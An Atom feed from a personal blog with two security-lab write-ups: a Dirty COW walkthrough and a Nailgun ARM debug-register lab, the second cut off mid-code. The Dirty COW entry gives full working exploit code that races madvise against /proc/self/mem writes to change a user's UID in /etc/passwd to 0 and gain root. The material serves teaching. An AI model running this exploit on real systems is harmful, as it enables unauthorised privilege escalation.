<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>My Blog</title>
  
  <subtitle>Recording Technology and Life</subtitle>
  <link href="https://www.sky-learner.top/atom.xml" rel="self"/>
  
  <link href="https://www.sky-learner.top/"/>
  <updated>2025-12-24T08:03:34.037Z</updated>
  <id>https://www.sky-learner.top/</id>
  
  <author>
    <name>Lin Wenqi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dirty COW Attack Lab</title>
    <link href="https://www.sky-learner.top/2025/11/Dirty-COW-Attack/"/>
    <id>https://www.sky-learner.top/2025/11/Dirty-COW-Attack/</id>
    <published>2025-11-26T12:00:00.000Z</published>
    <updated>2025-12-24T08:03:34.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="task-1-modify-a-dummy-read-only-file">Task 1: Modify a DummyRead-Only File</h2><h3 id="create-a-dummy-file">1. create a dummy file</h3><p><img src="/2025/11/Dirty-COW-Attack/t1_1.png" /></p><p>we can see that if we try to write to this file as a normal user, wewill fail, because the file is only readable to normal users.</p><span id="more"></span><h3 id="set-up-the-memory-mapping-thread">2. Set Up the Memory MappingThread</h3><p>The main thread</p><div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* cow_attack.c (the main thread) */</span></span><span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></span><span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span><span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;pthread.h&gt;</span></span><span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/stat.h&gt;</span></span><span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span><span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>map<span class="op">;</span></span><span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a></span><span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>writeThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">);</span></span><span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>madviseThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">);</span></span><span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span><span class="dt">char</span> <span class="op">*</span>argv<span class="op">[])</span></span><span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>    pthread_t pth1<span class="op">,</span>pth2<span class="op">;</span></span><span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> stat st<span class="op">;</span></span><span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> file_size<span class="op">;</span></span><span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Open the target file in the read-only mode.</span></span><span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> f <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/zzz&quot;</span><span class="op">,</span> O_RDONLY<span class="op">);</span></span><span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Map the file to COW memory using MAP_PRIVATE.</span></span><span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>    fstat<span class="op">(</span>f<span class="op">,</span> <span class="op">&amp;</span>st<span class="op">);</span></span><span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>    file_size <span class="op">=</span> st<span class="op">.</span>st_size<span class="op">;</span></span><span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>    map <span class="op">=</span> mmap<span class="op">(</span>NULL<span class="op">,</span> file_size<span class="op">,</span> PROT_READ<span class="op">,</span> MAP_PRIVATE<span class="op">,</span> f<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span><span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Find the position of the target area</span></span><span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>position <span class="op">=</span> strstr<span class="op">(</span>map<span class="op">,</span><span class="st">&quot;222222&quot;</span><span class="op">);</span></span><span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>    <span class="co">// We have to do the attack using two threads.</span></span><span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>    pthread_create<span class="op">(&amp;</span>pth1<span class="op">,</span> NULL<span class="op">,</span> madviseThread<span class="op">,</span> <span class="op">(</span><span class="dt">void</span> <span class="op">*)</span>file_size<span class="op">);</span></span><span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>    pthread_create<span class="op">(&amp;</span>pth2<span class="op">,</span> NULL<span class="op">,</span> writeThread<span class="op">,</span> position<span class="op">);</span></span><span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>    <span class="co">//Wait for the threads to finish.</span></span><span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>    pthread_join<span class="op">(</span>pth1<span class="op">,</span>NULL<span class="op">);</span></span><span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>    pthread_join<span class="op">(</span>pth2<span class="op">,</span>NULL<span class="op">);</span></span><span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span><span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>mmap: Maps a file or device into memory, allowing the file’s contentsto be accessed like an array in virtual memory.</p><ul><li>1st arg: Starting address for the mapped memory (usually set to NULLto let the kernel choose)<br /></li><li>2nd arg: Size of the mapped memory (in bytes, typicallypage-aligned)<br /></li><li>3rd arg: If the memory is readable or writable (PROT_READ,PROT_WRITE, etc.)<br /></li><li>4th arg: If updates are shared with other processes or kept private(MAP_SHARED or MAP_PRIVATE)<br /></li><li>5th arg: File that needs to be mapped (file descriptor fromopen)<br /></li><li>6th arg: Offset indicating from where inside the file the mappingshould start (must be page-aligned)</li></ul><h3 id="set-up-the-write-thread">3. Set Up the write Thread</h3><div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>writeThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">)</span></span><span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>content <span class="op">=</span> <span class="st">&quot;******&quot;</span><span class="op">;</span></span><span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    off_t offset <span class="op">=</span> <span class="op">(</span>off_t<span class="op">)</span>arg<span class="op">;</span></span><span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> f <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/proc/self/mem&quot;</span><span class="op">,</span> O_RDWR<span class="op">);</span></span><span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span><span class="op">(</span><span class="dv">1</span><span class="op">){</span></span><span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Move the file pointer to the corresponding position.</span></span><span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        lseek<span class="op">(</span>f<span class="op">,</span> offset<span class="op">,</span> SEEK_SET<span class="op">);</span></span><span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Write to the memory.</span></span><span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        write<span class="op">(</span>f<span class="op">,</span> content<span class="op">,</span> strlen<span class="op">(</span>content<span class="op">));</span></span><span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span><span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><h3 id="the-madvise-thread">4. The madvise Thread</h3><div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>madviseThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">)</span></span><span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> file_size <span class="op">=</span> <span class="op">(</span><span class="dt">int</span><span class="op">)</span>arg<span class="op">;</span></span><span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span><span class="op">(</span><span class="dv">1</span><span class="op">){</span></span><span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>        madvise<span class="op">(</span>map<span class="op">,</span> file_size<span class="op">,</span> MADV_DONTNEED<span class="op">);</span></span><span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span><span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>madvise: Provides advice to the kernel about how a specific memoryregion will be used, allowing the kernel to optimize memoryhandling.</p><ul><li>1st arg: Starting address of the memory region<br /></li><li>2nd arg: Size of the memory region (in bytes)<br /></li><li>3rd arg: Advice hint for how the memory will be used (e.g.,MADV_NORMAL, MADV_SEQUENTIAL, MADV_DONTNEED)</li></ul><p><strong>MADV_DONTNEED: The data in the specified memory range is nolonger needed. The kernel can discard the pages;</strong></p><h3 id="launch-the-attack">5. Launch the Attack</h3><p><img src="/2025/11/Dirty-COW-Attack/t1_2.png" /></p><p>We are able to see a modified <code>/zzz</code> file</p><h2 id="task-2-modify-the-password-file-to-gain-the-root-privilege">Task2: Modify the Password File to Gain the Root Privilege</h2><p>We create a new account called charlie, and we will turn this normaluser into root using the Dirty COW attack. Adding a new account can beachieved using the adduser command. After the account is created, a newrecord will be added to /etc/passwd. See the following</p><p><img src="/2025/11/Dirty-COW-Attack/t2_1.png" /></p><p>The main thread</p><div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span><span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;pthread.h&gt;</span></span><span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/stat.h&gt;</span></span><span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span><span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>map<span class="op">;</span></span><span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a></span><span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>writeThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">);</span></span><span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>madviseThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">);</span></span><span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">*</span>argv<span class="op">[])</span></span><span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    pthread_t pth1<span class="op">,</span>pth2<span class="op">;</span></span><span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> stat st<span class="op">;</span></span><span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> file_size<span class="op">;</span></span><span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Open the /etc/passwd in the read-only mode.</span></span><span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> f <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/etc/passwd&quot;</span><span class="op">,</span> O_RDONLY<span class="op">);</span></span><span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Map the file to COW memory using MAP_PRIVATE.</span></span><span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>    fstat<span class="op">(</span>f<span class="op">,</span> <span class="op">&amp;</span>st<span class="op">);</span></span><span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>    file_size <span class="op">=</span> st<span class="op">.</span>st_size<span class="op">;</span></span><span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>    map <span class="op">=</span> mmap<span class="op">(</span>NULL<span class="op">,</span> file_size<span class="op">,</span> PROT_READ<span class="op">,</span> MAP_PRIVATE<span class="op">,</span> f<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span><span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Find the position of the target area(charlie:x:1001 -&gt; charlie:x:0000)</span></span><span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>position <span class="op">=</span> strstr<span class="op">(</span>map<span class="op">,</span><span class="st">&quot;charlie:x:1001&quot;</span><span class="op">);</span></span><span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>    <span class="co">// We have to do the attack using two threads.</span></span><span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>    pthread_create<span class="op">(&amp;</span>pth1<span class="op">,</span> NULL<span class="op">,</span> madviseThread<span class="op">,</span> <span class="op">(</span><span class="dt">void</span> <span class="op">*)</span>file_size<span class="op">);</span></span><span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>    pthread_create<span class="op">(&amp;</span>pth2<span class="op">,</span> NULL<span class="op">,</span> writeThread<span class="op">,</span> position<span class="op">);</span></span><span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>    <span class="co">//Wait for the threads to finish.</span></span><span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>    pthread_join<span class="op">(</span>pth1<span class="op">,</span> NULL<span class="op">);</span></span><span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>    pthread_join<span class="op">(</span>pth2<span class="op">,</span> NULL<span class="op">);</span></span><span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span><span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>The write Thread</p><div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>writeThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">)</span></span><span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>content <span class="op">=</span> <span class="st">&quot;charlie:x:0000&quot;</span><span class="op">;</span>  <span class="co">//set the charlie&#39;s id to 0(root)</span></span><span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    off_t offset <span class="op">=</span> <span class="op">(</span>off_t<span class="op">)</span> arg<span class="op">;</span></span><span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> f <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/proc/self/mem&quot;</span><span class="op">,</span> O_RDWR<span class="op">);</span></span><span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span><span class="op">(</span><span class="dv">1</span><span class="op">){</span></span><span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Move the file pointer to the corresponding position.</span></span><span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>        lseek<span class="op">(</span>f<span class="op">,</span> offset<span class="op">,</span> SEEK_SET<span class="op">);</span></span><span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Write to the memory.</span></span><span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>        write<span class="op">(</span>f<span class="op">,</span> content<span class="op">,</span> strlen<span class="op">(</span>content<span class="op">));</span></span><span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span><span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>The madvise Thread</p><div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*</span>madviseThread<span class="op">(</span><span class="dt">void</span> <span class="op">*</span>arg<span class="op">)</span></span><span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> file_size <span class="op">=</span> <span class="op">(</span><span class="dt">int</span><span class="op">)</span>arg<span class="op">;</span></span><span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span><span class="op">(</span><span class="dv">1</span><span class="op">){</span></span><span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>        madvise<span class="op">(</span>map<span class="op">,</span>file_size<span class="op">,</span> MADV_DONTNEED<span class="op">);</span></span><span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span><span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>After compile the <code>cow_attack.c</code> with</p><div class="sourceCode" id="cb7"><preclass="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> cow_attack.c <span class="at">-lpthread</span></span></code></pre></div><p>We run the <code>a.out</code> and press Ctrl-C after a fewseconds</p><p><img src="/2025/11/Dirty-COW-Attack/t2_2.png" /></p><p>If we switch user to charlie, we are able to see the root shell. Ifyou run the id command, you should be able to see that you have gainedthe root privilege.</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;task-1-modify-a-dummy-read-only-file&quot;&gt;Task 1: Modify a Dummy
Read-Only File&lt;/h2&gt;
&lt;h3 id=&quot;create-a-dummy-file&quot;&gt;1. create a dummy file&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/2025/11/Dirty-COW-Attack/t1_1.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;we can see that if we try to write to this file as a normal user, we
will fail, because the file is only readable to normal users.&lt;/p&gt;</summary>
    
    
    
    <category term="Computer Science" scheme="https://www.sky-learner.top/categories/Computer-Science/"/>
    
    
    <category term="Security" scheme="https://www.sky-learner.top/tags/Security/"/>
    
    <category term="Linux" scheme="https://www.sky-learner.top/tags/Linux/"/>
    
    <category term="Attack" scheme="https://www.sky-learner.top/tags/Attack/"/>
    
  </entry>
  
  <entry>
    <title>Nailgun Attack Lab Analysis</title>
    <link href="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/"/>
    <id>https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/</id>
    <published>2025-11-26T10:00:00.000Z</published>
    <updated>2025-11-30T09:13:35.146Z</updated>
    
    <content type="html"><![CDATA[<h5 id="task-1-create-and-install-a-kernel-module">Task 1: Create andInstall a Kernel Module</h5><p>simple_module.c</p><div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* simple_module.c */</span></span><span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/module.h&gt;</span></span><span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/kernel.h&gt;</span></span><span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/init.h&gt;</span></span><span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;asm/io.h&gt;</span></span><span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span><span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> __init simple_module_init<span class="op">(</span><span class="dt">void</span><span class="op">)</span></span><span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span><span class="st">&quot;Helloworld.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span><span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span><span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span><span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span><span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="co"> *The cleanup function of the module.</span></span><span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span><span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> __exit simple_module_exit<span class="op">(</span><span class="dt">void</span><span class="op">)</span></span><span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span><span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO<span class="st">&quot;Exit.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span><span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span><span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>module_init<span class="op">(</span>simple_module_init<span class="op">);</span></span><span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>module_exit<span class="op">(</span>simple_module_exit<span class="op">);</span></span></code></pre></div><span id="more"></span><p>Makefile</p><div class="sourceCode" id="cb2"><preclass="sourceCode makefile"><code class="sourceCode makefile"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">obj-m</span> <span class="ch">+=</span><span class="st"> simple_module.o</span></span><span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span><span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="dv">all:</span></span><span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="er">        </span>make -C /lib/modules/<span class="ch">$(</span><span class="kw">shell</span><span class="st"> uname -r</span><span class="ch">)</span>/build M=<span class="ch">$(</span><span class="dt">PWD</span><span class="ch">)</span> modules</span><span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a></span><span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="dv">clean:</span></span><span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="er">        </span>make -C /lib/modules/<span class="ch">$(</span><span class="kw">shell</span><span class="st"> uname -r</span><span class="ch">)</span>/build M=<span class="ch">$(</span><span class="dt">PWD</span><span class="ch">)</span> clean</span></code></pre></div><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png" /></p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1.png" /></p><blockquote><p>Question 1 : What is the <strong>exception level</strong> and the<strong>security state</strong> of the core with loaded LKM?</p></blockquote><p>The core runs at <strong>Exception Level 1 (EL1)</strong> and in the<strong>Non-secure (Normal World)</strong> security state when the LKMis loaded.</p><h5 id="task-2-directly-access-a-high-privilege-register-scr">Task 2:Directly Access a High Privilege Register: SCR</h5><p><img src="accessing_scr_aarch32.png" /></p><div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* simple_module.c */</span></span><span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span><span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> __init simple_module_init<span class="op">(</span><span class="dt">void</span><span class="op">){</span></span><span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uint32_t</span> reg<span class="op">;</span></span><span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>        asm <span class="dt">volatile</span><span class="op">(</span><span class="st">&quot;mrc p15, 0, %0, c1, c1, 0&quot;</span><span class="op">:</span><span class="st">&quot;=r&quot;</span><span class="op">(</span>reg<span class="op">));</span></span><span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        printk<span class="op">(</span>KERN_INFO <span class="st">&quot;SCR </span><span class="sc">%x</span><span class="st">.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> reg<span class="op">);</span></span><span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span><span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span><span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span></code></pre></div><blockquote><p>Task 2.a : What is the complete instruction? Look up the manual andfill the instruction bellow. Then compile and execute.</p></blockquote><p>complete instruction:</p><pre class="assembly"><code>mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</code></pre><p>compile</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t2_1.png" /></p><p>try to install this kernel module</p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t2_2.png" /></p><p>A segmentation fault occurs.</p><blockquote><p>Task 2.b : Why the segmentation fault occurs?</p></blockquote><p>The segmentation fault occurs because the kernel module executes aprivileged instruction that is not allowed in the current processormode.</p><p>Specifically, the inline assembly instruction</p><pre class="assembly"><code>mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</code></pre><p>tries to access the Secure Configuration Register (SCR), whichbelongs to the <strong>secure world</strong>.</p><p>However, the Linux kernel runs in the <strong>non-secure world atEL1</strong>.</p><h5 id="task-3-read-the-debug-authentication-signal">Task 3: Read theDebug Authentication Signal</h5><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_3.png" /></p><p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_1.png" /></p><blockquote><p>Task 3.a: What is the instruction to read DBGAUTHSTATUS?</p></blockquote><pre class="assembly"><code>mrc p14, 0, &lt;Rt&gt;, c7, c14, 6</code></pre><p>dbgauth_module.c</p><div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* dbgauth_module.c */</span></span><span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/module.h&gt;</span></span><span id="cb7-3"><a href="#cb7-3" aria-hidden="true" 